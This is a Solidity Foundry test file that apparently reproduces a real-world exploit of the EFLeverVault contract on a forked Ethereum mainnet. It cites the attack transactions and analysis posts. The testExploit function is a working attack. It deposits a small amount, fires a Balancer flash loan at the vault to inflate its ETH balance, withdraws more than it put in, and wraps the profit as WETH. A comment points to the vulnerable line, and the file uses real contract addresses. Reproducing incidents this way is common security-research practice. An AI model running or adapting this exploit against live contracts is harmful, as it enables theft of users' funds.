// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @Analysis
// https://twitter.com/Supremacy_CA/status/1581012823701786624
// https://twitter.com/MevRefund/status/1580917351217627136
// https://twitter.com/danielvf/status/1580936010556661761
// @Attack tx
// https://etherscan.io/tx/0x1f1aba5bef04b7026ae3cb1cb77987071a8aff9592e785dd99860566ccad83d1 frontrun bot
// https://etherscan.io/tx/0x160c5950a01b88953648ba90ec0a29b0c5383e055d35a7835d905c53a3dda01e exploiter

interface EFLeverVault {
    function deposit(uint256) payable external;
    function withdraw(uint256) external;
}

contract ContractTest is DSTest{
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    EFLeverVault Vault = EFLeverVault(0xe39fd820B58f83205Db1D9225f28105971c3D309);
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    
    function setUp() public {
        cheats.createSelectFork("mainnet", 15746199); 
    }

    function testExploit() public {
        
        uint ETHBalanceBefore = address(this).balance;
        // deposit
        Vault.deposit{value: 1e17}(1e17);
        // FlashLoan manipulate Contract balance
        address [] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256 [] memory amounts = new uint256[](1);
        amounts[0] = 1_000 * 1e18;
        bytes memory userData = "0x2";

        emit log_named_decimal_uint(
            "[Start] Before flashloan, ETH balance",
            address(Vault).balance,
            18
        );
        balancer.flashLoan(address(Vault), tokens, amounts, userData);

        emit log_named_decimal_uint(
            "[Start] After flashloan, ETH balance",
            address(Vault).balance,
            18
        );
        Vault.withdraw(9e16);
        /*
      uint256 to_send = address(this).balance;  // vulnerable point, call flashloan first to make vault remain enough ETH.
      (bool status, ) = msg.sender.call.value(to_send)("");  //done
        */

        // ETH to WETH
        uint256 ETHProfit = address(this).balance - ETHBalanceBefore;
        address(WETH).call{value: ETHProfit}(abi.encodeWithSignature("deposit"));

        emit log_named_decimal_uint(
            "[End] Attacker WETH balance after exploit",
            WETH.balanceOf(address(this)),
            18
        );
    }

    receive() payable external {}

}
